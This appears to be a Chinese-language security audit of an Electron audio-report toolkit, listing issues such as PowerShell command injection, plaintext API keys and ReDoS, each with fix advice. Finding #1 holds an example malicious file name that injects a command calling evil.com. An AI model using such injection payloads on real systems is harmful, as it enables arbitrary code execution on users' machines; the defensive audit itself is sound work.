# TN Audio Toolkit — 高风险 Bug 审计报告

> 审计日期：2026-05-29 | 版本：v1.1.7 | 覆盖范围：主进程 ~20,000 行 JS + 渲染进程 React 18

---

## 🔴 严重风险 (Critical)

### 1. PowerShell 命令注入 — 文件路径未转义

**文件**: [reportConverter.js:112-129](../src/main/services/testDataExtraction/reportConverter.js#L112-L129), [imageExtractor.js:96-100](../src/main/services/reportReview/imageExtractor.js#L96-L100)

**问题**: 用户选择的文件路径被直接拼接到 PowerShell 脚本字符串中，仅对反斜杠做了转义，**没有处理单引号**。如果文件路径包含 `'`，可以直接逃出字符串上下文并注入任意 PowerShell 代码。

```javascript
// reportConverter.js:117 — 仅转义了反斜杠
`$doc = $app.Documents.Open('${inputPath.replace(/\\/g, '\\\\')}')`

// imageExtractor.js:98 — 同样的模式
'  $img = [System.Drawing.Image]::FromFile("' + f.wmf.replace(/\\/g, '\\\\') + '")'
```

**触发条件**: 攻击者构造包含单引号的文件名（如 `test'; Invoke-WebRequest http://evil.com; '`），诱导用户选择该文件。

**建议**: 使用 `execFile` + 参数数组传递路径，或使用 PowerShell 的 `-File` 参数配合 base64 编码的脚本块。

---

### 2. API Key 明文存储

**文件**: [settingsService.js:34-36](../src/main/services/settingsService.js#L34-L36), [settingsService.js:117-119](../src/main/services/settingsService.js#L117-L119)

**问题**: LLM API Key（用于图表分析的 OpenAI 兼容 API）通过 `electron-store` 以**明文 JSON** 存储在用户磁盘上（`%APPDATA%/tn-audio-tools/app-settings.json`）。任何能访问该文件的进程或恶意软件都可以读取。

```javascript
llm: {
    apiKey: '',    // 明文存储，无加密
    apiUrl: '',
    model: '',
}
```

**建议**: 使用 `safeStorage` API（Electron 内置）加密敏感字段后再持久化。

---

### 3. `shell.openExternal` 无 URL 白名单

**文件**: [main.js:418-428](../src/main/main.js#L418-L428)

**问题**: 自动更新模块的外部下载 URL 来自 `getExternalDownloadUrl()`，该函数从环境变量 `TN_AUDIO_UPDATE_MIRROR` 读取镜像地址。如果环境变量被篡改，`shell.openExternal` 可能打开恶意 URL。

```javascript
ipcMain.handle('app-update:open-external-download', async (_, payload) => {
  const targetUrl = getExternalDownloadUrl(preferMirror);
  await shell.openExternal(targetUrl);  // 无验证
});
```

**建议**: 对 URL 做白名单校验（至少限制协议为 `https` 且域名在允许列表中）。

---

## 🟠 高危风险 (High)

### 4. 正则表达式注入 (ReDoS)

**文件**: [reportAnalysis.js:861](../src/main/services/testDataExtraction/reportAnalysis.js#L861)

**问题**: JSON5 规则文件中的 `matchRegex` 字段直接传入 `new RegExp()`，没有超时保护。恶意的或错误的规则配置可能导致 ReDoS（正则拒绝服务），使主进程挂起。

```javascript
const regex = new RegExp(item.regexConfig.matchRegex, 'i');
```

**建议**: 使用 `re2` 库替代原生 RegExp，或添加正则编译前的大小/复杂度校验。

---

### 5. 文件扩展名检查绕过

**文件**: [main.js:646-650](../src/main/main.js#L646-L650)

**问题**: 文件类型验证仅检查扩展名，不检查文件魔数（magic bytes）。`.docx` 实际上是 ZIP 文件，但代码不验证内部结构。一个伪装成 `.docx` 的恶意 ZIP 炸弹可能耗尽内存。

```javascript
const ext = path.extname(payload.filePath).toLowerCase();
if (!['.doc', '.docx'].includes(ext)) {
    throw new Error(`不支持的文件格式: ${ext}`);
}
```

**建议**: 读取文件头几个字节验证魔数（`.docx` = `PK\x03\x04`, `.doc` = `\xD0\xCF\x11\xE0`）。

---

### 6. 临时文件可预测命名 → 符号链接攻击

**文件**: [imageExtractor.js:80-88](../src/main/services/reportReview/imageExtractor.js#L80-L88)

**问题**: WMF 临时文件使用 `Date.now()` 作为批次 ID，文件名可预测。本地攻击者可以预先创建同名符号链接，导致应用写入或读取攻击者指定的文件。

```javascript
var batchId = Date.now();
var wmfPath = path.join(tmpDir, 'tn_wmf_' + batchId + '_' + idx + '.wmf');
fsSync.writeFileSync(wmfPath, entry.buffer);  // 无 O_EXCL 标志
```

**建议**: 使用 `crypto.randomUUID()` 生成不可预测的文件名，并在写入前检查文件是否已存在。

---

### 7. LibreOffice 路径命令注入

**文件**: [reportConverter.js:139-171](../src/main/services/testDataExtraction/reportConverter.js#L139-L171)

**问题**: `execSync` 中报告路径仅用双引号包裹，如果路径本身包含双引号则注入可能发生。同时没有验证找到的 `libreoffice` 可执行文件确实是正版 LibreOffice。

**建议**: 使用 `spawn` + 参数数组代替 `execSync`，从根源上消除注入面。

---

### 8. 累积的 EventEmitter 监听器 → 内存泄漏

**文件**: [main.js:279-293](../src/main/main.js#L279-L293)

**问题**: `progressBus.on()` 在 `createWindow()` 中注册，但 macOS 上 `app.on('activate')` 可能多次调用 `createWindow()`。每次调用都会新增监听器而不移除旧监听器，导致处理函数被多次执行。

```javascript
progressBus.on(progressBus.events.CHART_PROGRESS_EVENT, function(data) { ... });
// 窗口重建时旧的监听器不会被移除
```

**建议**: 在窗口关闭时调用 `progressBus.removeListener()` 或在 `createWindow` 中先移除再添加。

---

## 🟡 中危风险 (Medium)

### 9. `clearRuntimeCache` 的宽泛目录匹配

**文件**: `main.js:157-162`

**问题**: 启动时清理所有以 `tn-audio-report-` 开头的临时目录。如果用户无意中创建了同名目录，其内容会被无提示删除。

---

### 10. 无取消机制的长时操作

**文件**: `TestDataCollectionPage.jsx`, `reportReviewModule/index.jsx`

**问题**: `processReports` 和 `performReview` 没有用户可触发的取消机制。对于大批量报告处理（20+ 文件 + AI 图表分析），用户只能等待或强制关闭窗口。

---

### 11. localStorage 结果序列化风险

**文件**: `modules/reportReview/storage.js`

**问题**: 完整的审查结果对象（含所有 sections、checklist、图片元数据）直接序列化到 `localStorage`。复杂报告的审查结果可能接近 5MB 限制，导致存储静默失败和历史记录丢失。

---

### 12. SpectrumAnalyzer 死代码

**文件**: `pages/SpectrumAnalyzer.jsx`

**问题**: 一个完全不可交互的存根页面被打包到生产构建中，所有控件均为 `disabled`，仅显示"功能开发中"。

---

## 总结风险矩阵

| 风险 | 严重度 | 可利用性 | 影响 |
|------|--------|----------|------|
| PowerShell 命令注入 | 🔴 Critical | 中（需诱导用户选择恶意路径） | 任意代码执行 |
| API Key 明文存储 | 🔴 Critical | 高（磁盘读取即可） | 凭证泄露 |
| shell.openExternal 无验证 | 🔴 Critical | 低（需环境变量篡改） | 钓鱼/恶意网站 |
| ReDoS 正则注入 | 🟠 High | 中（需篡改规则文件） | 主进程挂起 (DoS) |
| 扩展名绕过 | 🟠 High | 中（恶意文件） | 内存耗尽/OOM |
| 符号链接攻击 | 🟠 High | 低（需本地访问） | 文件写入劫持 |
| LibreOffice 命令注入 | 🟠 High | 低（路径含引号极罕见） | 命令执行 |
| EventEmitter 泄漏 | 🟠 High | 低（macOS 多窗口场景） | 内存泄漏 |
| 临时目录误删 | 🟡 Medium | 低 | 用户数据丢失 |
| 无取消机制 | 🟡 Medium | — | 用户体验差 |
| localStorage 溢出 | 🟡 Medium | — | 历史记录丢失 |

---

## 优先修复建议

1. **立即修复 (P0)**: PowerShell 命令注入（#1）、API Key 加密存储（#2）
2. **尽快修复 (P1)**: shell.openExternal 白名单（#3）、ReDoS 保护（#4）、文件魔数验证（#5）
3. **下个迭代 (P2)**: 临时文件安全命名（#6）、LibreOffice spawn 替换（#7）、EventEmitter 清理（#8）
4. **技术债 (P3)**: localStorage 迁移到 IndexedDB、添加取消机制、移除死代码
